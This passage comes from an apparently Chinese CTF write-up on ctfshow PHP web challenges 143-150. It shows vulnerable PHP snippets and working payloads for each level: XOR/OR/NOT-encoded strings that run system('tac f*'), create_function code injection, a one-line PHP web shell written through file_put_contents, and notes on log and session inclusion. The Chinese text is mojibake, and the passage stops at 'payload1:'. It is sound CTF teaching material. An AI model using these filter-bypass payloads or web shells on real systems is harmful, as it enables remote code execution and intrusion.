class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'get out hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>åŒ142ï¼Œbanäº†å–åå’Œæˆ–åŒæ—¶ä¹Ÿbanäº†+-å¯ä»¥ä½¿ç”¨*ï¼Œå¥½åƒæ²¡banå¼‚æˆ–<code>^</code></p><p>Payload:<code>?v1=1&amp;v2=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%00%06%0c%01%07%01%0f%08%0f&quot;^&quot;%7f%60%60%20%60%60%60%60%2f%7f%60%7f&quot;)*</code></p><h4 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\W+$/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">1</span><span class="token operator">?</span><span class="token constant boolean">true</span><span class="token punctuation">:</span><span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>é™åˆ¶äº†v3çš„é•¿åº¦ï¼Œå¹¶å¯¹v2è¿›è¡Œcheck,å¯ä»¥ä½¿ç”¨<code>|``^</code>åªæ˜¯è°ƒæ¢ä½ç½®ç½¢äº†</p><p>Payload:<code>?v1=1&amp;v2=(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%14%01%03%00%06%0c%01%07%00%10%08%10&quot;|&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;)&amp;v3=-</code></p><h4 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\>|\*|\/|\^|\#|\"/i'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'get out hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>æ­£åˆ™è¿ç®—éƒ½è¢«banäº†ï¼Œå¯ä»¥ä½¿ç”¨<code>|</code>å’Œ<code>~</code>æˆ–è€…ä¸‰ç›®è¿ç®—ç¬¦ï¼Œå¦å¤–<code>&quot;</code>ä¹Ÿè¢«banäº†ï¼Œå¯ä»¥ä½¿ç”¨<code>&#39;</code></p><p>Payload:</p><blockquote><p>?v1&#x3D;0&amp;v2&#x3D;0&amp;v3&#x3D;|(â€˜%13%19%13%14%05%0dâ€™|â€™%60%60%60%60%60%60â€™)(â€˜%14%01%03%00%06%0c%01%07%02%10%08%10â€™|â€™%60%60%60%20%60%60%60%60%2c%60%60%60â€™)|</p><p>?v1&#x3D;%0a1&amp;v2&#x3D;%0a0&amp;v3&#x3D;?(<del>%8c%86%8c%8b%9a%92)(</del>%9c%9e%8b%df%99%d5):</p></blockquote><h4 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h4><p>ä¸‰ç›®è¿ç®—ç¬¦è¢«banäº†ï¼Œä½†æ˜¯å½±å“ä¸å¤§</p><h4 id="web147-PHPå‘½åç©ºé—´-create-functionå‡½æ•°ä»£ç æ³¨å…¥"><a href="#web147-PHPå‘½åç©ºé—´-create-functionå‡½æ•°ä»£ç æ³¨å…¥" class="headerlink" title="web147(PHPå‘½åç©ºé—´  create_functionå‡½æ•°ä»£ç æ³¨å…¥)"></a>web147(PHPå‘½åç©ºé—´  create_functionå‡½æ•°ä»£ç æ³¨å…¥)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9_]*$/isD'</span><span class="token punctuation">,</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$ctfshow</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>æ­£åˆ™åŒ¹é…ç»•è¿‡ï¼Œåªè¦ctfshowé‡Œæœ‰ä¸€ä¸ªä¸æ˜¯æ•°å­—ã€å°å†™å­—æ¯å’Œä¸‹åˆ’çº¿å°±èƒ½ç»•è¿‡ã€‚</p><blockquote><p><strong>&#x2F;i</strong>ï¼šå¤§å°å†™ä¸æ•æ„ŸåŒ¹é…</p><p><strong>&#x2F;s</strong>ï¼šç‚¹å·å…ƒå­—ç¬¦åŒ¹é…æ‰€æœ‰å­—ç¬¦ï¼ŒåŒ…å«æ¢è¡Œç¬¦ã€‚</p><p><strong>&#x2F;D</strong>ï¼šå…ƒå­—ç¬¦ç¾å…ƒç¬¦å·ä»…ä»…åŒ¹é…ç›®æ ‡å­—ç¬¦ä¸²çš„æœ«å°¾</p></blockquote><blockquote><p>phpé‡Œé»˜è®¤å‘½åç©ºé—´æ˜¯\ï¼Œæ‰€æœ‰åŸç”Ÿå‡½æ•°å’Œç±»éƒ½åœ¨è¿™ä¸ªå‘½åç©ºé—´ä¸­ã€‚ è°ƒç”¨ä¸€ä¸ªå‡½æ•°æ—¶ç›´æ¥å†™å‡½æ•°åfunction_name()ï¼Œç›¸å½“äºæ˜¯ç›¸å¯¹è·¯å¾„è°ƒç”¨ï¼› å¦‚å†™æŸä¸€å…¨å±€å‡½æ•°çš„å®Œå…¨é™å®šåç§°\function_name()è°ƒç”¨ï¼Œåˆ™æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚</p></blockquote><p><img src="web147.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"></p><p>ï¼ˆè¯¦æƒ…å¯ä»¥çœ‹phpæ‰‹å†Œé‡Œçš„å‘½åç©ºé—´éƒ¨åˆ†ï¼‰</p><p>æ‰€ä»¥postæ—¶<code>ctf</code>å¯ä»¥é€šè¿‡åŠ ä¸Š<code>\</code>ç»•è¿‡åŒ¹é…ã€‚%5c</p><p>æ‰¾ä¸ªä¸éœ€è¦ç¬¬ä¸€ä¸ªå‚æ•°çš„å‡½æ•°ã€‚å¯ä»¥ç”¨create_functionåŒ¿åå‡½æ•°ã€‚è™½ç„¶è¯¥å‡½æ•°è‡ªPHP 7.2èµ·å·²ç»å¼ƒç”¨ï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥evalæ‰§è¡Œå‡½æ•°ï¼Œåªæ˜¯éœ€è¦æŠŠåŒ¿åéƒ¨åˆ†é—­åˆã€‚</p><p><strong>get</strong>ï¼š<code>?show=&#125;system(&#39;tac f*&#39;);/*</code> <strong>post</strong>ï¼š<code>ctf=%5ccreate_function</code> <img src="web147_2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"></p><p>å¯ä»¥è¿™ä¹ˆç†è§£ï¼šcreate_functionåˆ›å»ºä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œæˆ‘ä»¬å‡è®¾å°±å«nimingã€‚ <code>string create_function( string $args, string $code)</code>é‚£ä¹ˆå…·ä½“å°±æ˜¯å¦‚ä¸‹é¢æ‰€ç¤ºçš„æ ·å­ï¼š</p><pre class="language-none"><code class="language-none">function niming($args,...)&#123;$code&#125;</code></pre><p>æ‰€ä»¥å°±éœ€è¦<code>&#125;</code>é—­åˆï¼Œé—­åˆä¹‹åï¼Œé‚£å°±å¤šå‡ºæ¥ä¸€ä¸ª<code>&#125;</code>ï¼Œè¿™å°±éœ€è¦ç”¨æ³¨é‡Šç¬¦æ³¨é‡Šæ‰ã€‚</p><h4 id="web148-ä¸­æ–‡å˜é‡-å¼‚æˆ–"><a href="#web148-ä¸­æ–‡å˜é‡-å¼‚æˆ–" class="headerlink" title="web148(ä¸­æ–‡å˜é‡  å¼‚æˆ–)"></a>web148(ä¸­æ–‡å˜é‡  å¼‚æˆ–)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[A-Za-z0-9_\%\\|\~\'\,\.\:\@\&amp;\*\+\- ]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_ctfshow_fl0g</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>æ²¡banå¼‚æˆ–</p><p>Payloadï¼š<code>?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%0c%01%07%01%0b%08%0b&quot;^&quot;%7d%60%60%21%60%60%60%60%2f%7b%60%7b&quot;);</code></p><p>é¢„æœŸè§£æ˜¯ä½¿ç”¨ä¸­æ–‡ <code>?code=$å“ˆ=&quot;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$å“ˆ&#125;[å“¼]($&#123;$å“ˆ&#125;[å—¯]);&amp;å“¼=system&amp;å—¯=tac f* </code></p><p><code>&quot;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;</code> å¼‚æˆ–å‡ºæ¥çš„ç»“æœæ˜¯ _GET</p><h4 id="web149-unlink-æ–‡ä»¶è¦†ç›–"><a href="#web149-unlink-æ–‡ä»¶è¦†ç›–" class="headerlink" title="web149(unlink  æ–‡ä»¶è¦†ç›–)"></a>web149(unlink  æ–‡ä»¶è¦†ç›–)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p><strong>unlink()</strong> å‡½æ•°åˆ é™¤æ–‡ä»¶ã€‚</p><p>è‹¥æˆåŠŸï¼Œåˆ™è¿”å› trueï¼Œå¤±è´¥åˆ™è¿”å› falseã€‚</p><p>ç›´æ¥å‘index.phpå†™é©¬å°±è¡Œ</p><p>Payload</p><blockquote><p>GET:?ctf&#x3D;indx.php</p><p>POST:show&#x3D;<?php system($_GET[a]);?></p></blockquote><h4 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">CTFSHOW</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$vip</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$secret</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">vip</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">secret</span> <span class="token operator">=</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">secret</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">isVIP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">vip</span><span class="token operator">?</span><span class="token constant boolean">TRUE</span><span class="token punctuation">:</span><span class="token constant boolean">FALSE</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__autoload</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$class</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#è¿‡æ»¤å­—ç¬¦</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\_| |\[|\]|\?/'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token variable">$__CTFSHOW__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"class is exists!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$isVIP</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">":"</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>isVIPå¯ä»¥é€šè¿‡extractè¿›è¡Œå˜é‡è¦†ç›–ï¼Œctfè¢«é™åˆ¶ä¸èƒ½æœ‰:</p><p>å¯ä»¥åˆ©ç”¨nginxæ—¥å¿—æ–‡ä»¶å†™é©¬</p><p><img src="web150.png" loading="lazy"></p><h4 id="web150-plus-autoload-class-exists"><a href="#web150-plus-autoload-class-exists" class="headerlink" title="web150_plus(__autoload  class_exists)"></a>web150_plus(__autoload  class_exists)</h4><p>è¿‡æ»¤äº†logï¼Œçœ‹ç€å¯ä»¥ç”¨æ¡ä»¶ç«äº‰</p><p>çœ‹äº†hint åˆ©ç”¨ <code>__autoload()</code></p><p>äºæ˜¯æŸ¥äº†ä¸€ä¸‹ <code>class_exists()</code> è¿™ä¸ªå‡½æ•°</p><p><img src="web150_plus.png" alt="https://img.exp10it.io/img/202208131706165.png" loading="lazy"></p><p>ä¿®å¤äº†éé¢„æœŸï¼Œä¸è®©åŒ…å«æ—¥å¿—æ–‡ä»¶äº†ã€‚</p><p>è¿™é‡Œåˆ©ç”¨äº† <code>extract</code> è¦†ç›–å˜é‡ä¼šæŠŠ <code>ç©ºæ ¼ [ .</code> éƒ½ç»™è½¬æˆä¸‹åˆ’çº¿çš„ç‰¹æ€§ï¼Œç»•è¿‡æ­£åˆ™è¿‡æ»¤ã€‚ç„¶åå°±æ˜¯ <a href="https://www.php.net/manual/zh/function.class-exists.php"><code>class_exists</code></a> ç¬¬äºŒä¸ªå‚æ•°é»˜è®¤ä¸º <code>true</code>ï¼Œåœ¨ç±»ä¸å­˜åœ¨æ—¶ä¼šè°ƒç”¨ <code>__autoload</code> å‡½æ•°ï¼Œ<code>__autoload</code> è¿™é‡Œå†™çš„æ˜¯è°ƒç”¨è¦åŠ è½½çš„ç±»åçš„å‡½æ•°ï¼Œä¼  <code>phpinfo</code> å°±èƒ½å¾—åˆ° <code>session</code>ç›¸å…³ä¿¡æ¯ï¼Œä»è€ŒåŒ…å« <code>session</code>ã€‚</p><p>payload1: 